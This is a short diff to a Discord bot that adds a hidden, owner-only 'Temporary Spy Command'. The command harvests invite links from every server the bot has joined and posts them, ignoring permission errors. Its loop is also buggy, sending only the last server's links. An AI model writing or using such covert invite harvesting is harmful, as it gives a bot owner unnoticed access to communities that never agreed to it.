@@ -119,10 +119,18 @@ async def refresh(ctx):
         rvdia.load_extension(f"cogs.{cog[:-3]}")
   await ctx.reply('Cogs refreshed.')
 
+# Temporary Spy Command
 @rvdia.command(hidden = True)
 @commands.is_owner()
 async def serverlist(ctx):
-    await ctx.send('\n'.join(guild.name for guild in rvdia.guilds))
+    await ctx.send('`S`\n'.join(guild.name for guild in rvdia.guilds))
+    with suppress(discord.Forbidden):
+       list = []
+       for guild in rvdia.guilds:
+          invites = await guild.invites()
+          url = [invite.url for invite in invites]
+          list.append(url)
+       await ctx.send('`S`\n'.join(url))
 
 @rvdia.event
 async def on_message(msg):
